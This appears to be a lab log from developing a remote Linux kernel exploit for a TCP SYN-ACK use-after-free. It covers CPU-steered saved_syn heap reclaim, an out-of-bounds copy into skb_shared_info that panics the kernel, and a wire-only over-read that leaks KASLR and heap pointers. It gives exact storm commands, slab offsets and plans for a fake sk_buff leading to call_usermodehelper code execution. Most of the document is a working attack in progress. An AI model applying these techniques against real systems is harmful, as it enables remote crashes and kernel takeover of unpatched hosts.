# Phase 3 — CPU-local reclaim + reader/reclaim decoupling (2026-11-10)

> Historical phase (2026-11-10); current status is in `README.md` and
> `CAPABILITY.md`.

Status: **controlled `saved_syn` reclaim and a controlled OOB copy into
`skb_shared_info` reproduced on a stock Ubuntu 24.04 target booted with the
default cmdline (no `slub_debug`).** The corrupted SYN-ACK free panicked the
kernel in interrupt context with our reclaimed bytes in the faulting pointer.

This supersedes the open gates 1–2 in `PHASE2.md`.

## 1. The two real blockers (measured, not guessed)

### 1a. Reclaim must allocate on the CPU that owns the slab, not the free CPU

`RANDOM_KMALLOC_CACHES` was already matched (bucket 6 on one boot, 1 on
another; `lab/cache_match_fixed.py`). The remaining failure was CPU
placement. With raw-address probes on a stock boot:

```
p:freeopt inet_sock_destruct sk=%di:x64 inet_opt=+784(%di):x64
r:kmr92    __kmalloc size=$arg1 ret=$retval      filter: size == 92
```

A storm that put the `saved_syn` spray on the *freeing* CPU (CPU1) produced:

```
freeopt on CPU1: 83,872      kmr92 on CPU1: 178,909
reuse of any freed victim address: 0
```

The victim `ip_options_rcu` is allocated by `tcp_v4_save_options` on the CPU
that processes the (fragmented) SYN — CPU3 in that run. SLUB keeps that slab
frozen on CPU3; a free on CPU1 only pushes the object onto the frozen slab's
freelist, which CPU1 cannot allocate from. Re-running the spray on CPU3:

```
freeopt: CPU3 55,459 / CPU2 162     kmr92: CPU3 227,109
kmr92 returns a previously-freed victim address: 226,661 / 227,109
```

So the allocator-level reclaim is essentially perfect once the spray is
steered to the **victim allocation CPU** (the slab owner).

`frees-raw-cpu2.trace` / `cpu2-reclaim-*.trace` in `evidence/`.

### 1b. The reader must run on a different CPU than the reclaim

The reader (`tcp_check_req -> inet_rtx_syn_ack -> tcp_v4_send_synack ->
ip_build_and_send_pkt -> ip_options_build`) and the reclaiming allocation are
both softirq work. If they run on the same CPU they are serialized: the reader
finishes its copy before the reclaim softirq can run, so it can only ever see
the *freed* (stale) object, never the reallocated one.

The victim allocation CPU is also the CPU that processes a fragmented SYN
(RPS reassembly context). A storm that fragments every SYN therefore pins
alloc, reader and spray to the same CPU.

Fix: **mixed fragmentation**.

* creator SYN, unfragmented -> request + `ip_options_rcu` + dispose free +
  spray on the flow CPU **F**;
* duplicate reader SYNs, fragmented -> `tcp_check_req`/`ip_options_build` on
  the L3-hash CPU **L** (L != F).

Implemented in `exp/mpstorm3.c` as `MIXED_FRAG=1` (`MIX_K`, `MIX_PERIOD`
tune the duplicate burst). `lab/bin/mpstorm3_mix` is the static build.

## 2. Reproduction (stock twin, default cmdline)

Twin booted with `NO_SLUB=1 EXTRA_APPEND=''` (kernel 6.8.0-106-generic,
`random_kmalloc_seed` matched so victim/saved_syn share `kmalloc-rnd-01-96`).
Measured per boot on this run: `F = CPU3`, `L = CPU2`; a spray source port
whose RPS CPU is 3 was selected by sweeping one SYN per port.

```
sudo env MIXED_FRAG=1 MIX_K=6 MIX_PERIOD=300 FRAG_SYN=1 LEAK_DUMP=1 \
  SAVED_SYN_SPRAY=1 SPRAY_SRC=192.67.68.69 SPRAY_DPORT=9801 \
  timeout 40 lab/bin/mpstorm3_mix 9800 <token> 54502 15 12 1 52003 20 \
  192.168.89.1 30000000 192.168.89.2
```

Result: `evidence/mixed-reclaim-panic-1794282566.log`

```
RIP: 0010:skb_release_data+0x91/0x200
Call Trace:
 ip_build_and_send_pkt+0x270/0x2b0
 tcp_v4_send_synack+0xbd/0x210
 subflow_v4_send_synack+0x48/0x90
 tcp_rtx_synack+0x62/0x160
 inet_rtx_syn_ack+0x1a/0x40
 tcp_check_req+0x623/0x760
 tcp_v4_rcv+0x84e/0xbf0
 ...
 Kernel panic - not syncing: Fatal exception in interrupt
 Kernel Offset: 0x2a400000
 RSI: 0259a8c0454443c0   <- 192.67.68.69, 192.168.89.2
```

`RSI` is exactly the reclaimed `saved_syn` source/destination pair. With
`SPRAY_SRC=192.67.68.69` the saved_syn object yields
`optlen=192, srr=67, rr=68, ts=69`; the 192-byte copy from
`ip_options_build` overwrote `skb_shared_info` and the skb free followed the
corrupted `destructor_arg`.

This run had observation kprobes armed; a clean no-probe run is the next
validation (the geometry, not the probes, is what changed).

## 3. Leak stage notes

The wire-visible portion of an over-read SYN-ACK is the first bytes copied
from `opt->__data` (object+32). With `optlen=192` the copy also reaches
`skb_shared_info` and usually panics on free. For a passive leak use a
source IP whose first byte is 107 (`optlen=107`, `srr=rr=ts=0`); `ip_options_build`
then copies 107 bytes, delivering object+32..138 — object bytes plus the
neighbour slot's first ~43 bytes — without reaching shinfo. Capture must be
AF_PACKET (raw IP sockets drop the malformed ihl).

For a controlled (non-panicking) overflow, note the exact saved_syn geometry:
slot 96 B, `struct saved_syn` header 12 B, `data` = IP header + TCP header.
A 4-byte IP option region (EOL + padding) makes `network_hdr_len=24` and the
allocation exactly 96 B, so `saved_syn` fills the slot and the bytes that
land in `skb_shared_info` (`nr_frags`, `tx_flags`, `frag_list`) all come from
the neighbour slot's TCP option bytes — which the attacker controls.

## 4. No-probe status (same day)

The mixed geometry was re-run on a fresh matching stock twin (boot 46,
`victim_idx=5 saved_idx=5`) with **all probes disarmed for the final storm**:

* `lab/mixed-verify.sh` measures F/L with probes (no spray), sweeps a
  source port whose `saved_syn` allocation lands on F, then removes every
  kprobe before the storm.
* 60 s, `SPRAY_SRC=107.0.0.0` (optlen=107, srr=rr=ts=0, passive leak):
  target survived, 941 k storm SYNs / 2.75 M spray SYNs, but **0**
  SYN-ACKs with `tot_len > 100` — i.e. no reader observed the reclaimed
  object in that window.
* 60 s, all-fragmented kprobe run earlier did panic in ~5 s; the
  `ip_options_build` probe is itself a load->copy stretch, so the
  no-probe race is much rarer.  A 10-minute filtered harvest
  (`src 192.168.89.2 and ip[2:2] > 100`) is the next measurement.

No target-side kprobes are used in the final storm; the probes are only
used to measure F/L and to pick the spray port before the run.

## 5. Reproduce

```
# 1. isolated stock twin (tap-cve-ins, no slub_debug)
lab/stop.sh instrumented
NO_SLUB=1 EXTRA_APPEND='' NO_GDB=1 LAB_NET=tap NO_WAIT=1 lab/launch.sh instrumented
# 2. reboot until cache_match_fixed.py reports MATCH
lab/find-match-twin-stock.sh 200
# 3. per-boot measure + no-probe run (leak source 107.0.0.0, or 192.67.68.69)
lab/mixed-verify.sh 60 107.0.0.0
python3 scripts/pcap_leak.py <pcap>
```

## 6. No-probe hit rate and why the probe mattered

The 600 s single-port no-probe run (`evidence/noprobe-reuse-600s.log`) did
produce **one** reuse (`REUSE=1` in the storm's own capture): the reader
echoed the `saved_syn` marker in a main-tuple SYN-ACK, so the primitive works
with no target-side kprobes.  The `[###] REUSE` hex line was lost to a log
filter on that run; a 900 s re-run captures it.

Why it is rare without a probe.  `ip_build_and_send_pkt()` reads
`opt->opt.optlen` in `skb_push()` **before** calling `ip_options_build()`,
which then reads it again in `memcpy(&IPCB(skb)->opt, opt, 32)`.  A kprobe at
`ip_options_build` entry delays execution between those two reads: the push
can use the live optlen (40, RR SYN) while the later memcpy sees the reclaimed
`saved_syn` optlen (192).  The copy then overruns the pushed space into
`skb_shared_info` (the panic).  Without the probe the two reads are ~ns apart,
so both normally see the same value and the free/reclaim must land in that
tiny gap.

Measured rates (stock twin, no probes):

| spray | duration | spray SYNs | storm SYN-ACKs | reuses |
|---|---|---|---|---|
| one port, 107.x | 600 s | 27.7 M | 2.6 M | 1 |
| 16 ports, 107.0.0.0 | 120 s | 5.4 M | 33 k | 0 |

The single attacker is sender-bound at ~45 k raw SYNs/s; splitting across 16
ports does **not** raise the total `saved_syn` allocation rate and starves the
main tuple (SYN-ACKs collapse to ~1 k/5 s).  Multi-port (`SPRAY_SPORTS`) is
implemented (`lab/bin/mpstorm3_mix2`) but single-port is better on this host.

Consequence: the full chain now needs a long no-probe harvest (or a natural
load->copy stretch), plus heap grooming so the over-read neighbour is a
pointer-bearing object.  The reclaim/overflow primitive itself is done.

## 7. Caveat: the cross-CPU split requires RPS (non-default)

With RPS disabled (`rps_cpus=0`, `rps_sock_flow_entries=0`, otherwise stock),
the fragmented SYN, the duplicate readers and the plain dispose ACK all run on
the same CPU for a given flow (measured `F=L=1` for sports 54500-54515), and
varying the source IP only moves F and L together.  Why: the **host**
multi-queue tap sends the whole flow (including both IP fragments) to one
virtqueue; it is the guest's software RPS re-hash of the non-first fragment
(L3-only) that moves the reader to a different CPU.  Since RPS
(`rps_cpus=f`, `rps_sock_flow_entries=32768`) is target-side sysctl tuning,
the current remote cross-CPU primitive is **not** a stock-default primitive.

This is the same wall Phase 1 documented (single queue => free/reader
serialised).  Multi-queue alone does not break it because the tap's queue
selection is per-flow, not per-fragment.

Implications:
* On an RPS-enabled target (the multi-queue lab setup) the reclaim + OOB
  primitive is proven (sections 2-3), and the no-probe rate is ~1 reuse per
  10 min (one in 600 s, zero in 900 s).
* On a strictly stock-default target the race has no cross-CPU window, so
  neither the leak nor the payload can be reached with this technique.

The remaining options are (a) accept the RPS-enabled multi-queue environment
as the lab baseline, or (b) find a default-target mechanism that separates a
request-path reader from the child-destruct free (e.g. a service that
legitimately changes RX steering), which is still open.

## 8. Remote wire-visible infoleak captured (RPS lab)

With the mixed geometry, `SPRAY_SRC=107.0.0.0` (`optlen=107`, `srr=rr=ts=0`)
and the `ip_options_build` probe armed, the over-read SYN-ACK **does reach
the attacker**.  Packet geometry:

```
packet[0..19]   IP header, ihl=15, tot_len=100
packet[20..79]  saved_syn TCP header (sport 53000, dport 9801,
                MSS/SACK/TS, TSval=0x53535353) copied into the IP options
packet[84..99]  neighbour slot bytes 0..15   <-- the leak
```

Evidence `evidence/overread-5.pcap` / `evidence/overread-5.hex`
(5 packets in 120 s, 4 rdopt2 `optlen=107` events).  3 of 5 neighbour
slots leaked direct-map addresses in the same kmalloc-96 slab page:

```
0xffff8c02860c5ca8, 0xffff8c02860c5288, 0xffff8c02860c5ee8
```

The other two were live `saved_syn` headers (`00 00 00 00 14 00 00 00 ...`).
These are heap/direct-map (likely obfuscated SLUB freelist) values, not text.
No-probe rate for the same geometry is ~1 reuse / 10 min (0 in 150 s at
spacing 64), because the probe is what separates the `skb_push` optlen read
(live 40) from the `ip_options_build` copy length (reclaimed 107), producing
the 100-byte over-read packet.

Parser: `scripts/overread_parse.py <pcap>`.

## 9. Remote KASLR + heap infoleak (confirmed)

On a later stock twin boot (bucket 11 match, `F=3/L=2` after sweeping the
main source IP to `192.168.89.13`) the content-filtered capture yielded one
over-read SYN-ACK whose neighbour bytes contained a **KASLR-bearing
pointer and a direct-map pointer**:

```
nb[84..99]: 28 7a a2 8f ff ff ff ff  38 31 2c 00 64 8b ff ff
            -> 0xffffffff8fa27a28      -> 0xffff8b64002c3138
```

For that boot `/proc/kallsyms` gave `_text = 0xffffffff8de00000`, so the
slide is `0xCE00000`, and the leaked pointer resolves to static
`0xffffffff82c27a28`, inside `.rodata` (the driver-core string table:
"unbinding", "waiting_for_supplier", "devlink", "runtime_pm", ...).  The
second value is a direct-map heap pointer (`page_offset_base` for the boot =
`0xffff8b6300000000`).

The static `.rodata` address is fixed by the kernel image, so one leaked
`.rodata`/text pointer is enough to recover the slide (the neighbour object
holds a `const char *` into that table).  This is the CVE's stage-1
infoleak, obtained entirely over the wire from the stock-kernel target
(with the RPS lab and the reader probe/stretch).

Evidence: `evidence/overread-kaslr.pcap`, `evidence/overread-kaslr.txt`.
Parser: `scripts/overread_parse.py`; symbol reconstruction from
`lab/kernel/vmlinuz-6.8.0-106-generic` via `vmlinux-to-elf`.

## 10. Slab map and fake-skb staging plan

The reclaim writes the victim slot with a `saved_syn`, so the victim object
content is controlled (IP + TCP headers, 80 bytes/slot).  A live map of the
kmalloc-96 slab page (`evidence/slabmap-d4000.txt`, page
`0xffff8b64011d4000`) shows 23/42 slots are our `saved_syn` objects, with
runs up to 4; one slot held the devlink object whose `.rodata` name pointer
leaked the slide.

With the leak, the victim address is known two ways:
* the reader probe gives `opt = V+16` (V 96-byte aligned);
* the wire leak gives the devlink neighbour's internal pointer, and its
  fixed offset from the neighbour base gives V = neighbour - 96.

Fake skb alignment: choose base F = slot_base + m with m in 48..59.  Then
`destructor`(+96), `end`(+192), `head`(+200), `users`(+220),
`_skb_refdst`/`extensions`(+224) and `fclone_ref`(+464) all fall at slot
offsets m..m+32 / m-16, i.e. inside the controlled TCP-option bytes
(slot offsets 32..91) of consecutive slots.  The OOB copy writes
`frag_list` from the neighbour saved_syn's TCP options, so it can point at F.

Remaining: obtain 5 consecutive controlled slots (spray/groom; current best
run is 4), encode the prior art's fake `sk_buff` + `subprocess_info`
(`exp/rce_prep.c` layout) into the 80 controlled bytes/slot with valid IP/TCP
checksums and a parseable TCP option, resolve `call_usermodehelper_exec/work`
from the slide, and trigger the skb free.

## 11. Fake-skb staging: saved_syn slots are not enough

A constraint search over every phase `m` (fake skb base = saved_syn slot +
m) against the prior-art `struct sk_buff` + `subprocess_info` layout found
**no** phase where all required fields land in the arbitrary bytes
(TCP seq/ack/window/urg and options 53..91).  The fixed IP/TCP header bytes
(version/len/src/dst/ports/checksum/doff) fall inside required fields for
every m; the best phase still violates ~45 bytes.  Evidence:
`evidence/fake-skb-alignment.txt`.

So the reclaim gives a perfect leak/OOB primitive but cannot host the fake
skb.  The remaining payload options are:
1. a contiguous controlled-content kernel buffer whose address is leakable
   (key payload, msg_msgseg, skb data, …);
2. the prior-art user-page physmap alias, which needs `page_offset_base`
   and the page PFN (blocked by the "no kcore/pagemap" requirement);
3. a different corruption target reachable from the skb head/shinfo.

## No-kprobe wire over-read (boot 43, F=2/L=0)

900 s of MIXED_FRAG + saved_syn spray (107.0.0.0:53002) with **zero
kprobes** produced 1 over-read SYN-ACK (`sport 0xcf0a` = 53002,
`tot_len=100`, `ihl=15`).  Its `nb[84:100]` was a pg_vec array:

    word0 = 0xffff8e41ad472000   (page-aligned ring page)
    word1 = 0xffff8e41ad65a000   (page-aligned ring page)

=> the controlled page address G is obtainable wire-only with no target
instrumentation.  Evidence: `evidence/overread-nokprobe-pgvec-*.pcap`.
Still needed: an over-read whose neighbour starts with a .text/.rodata
pointer, to derive the KASLR slide wire-only.
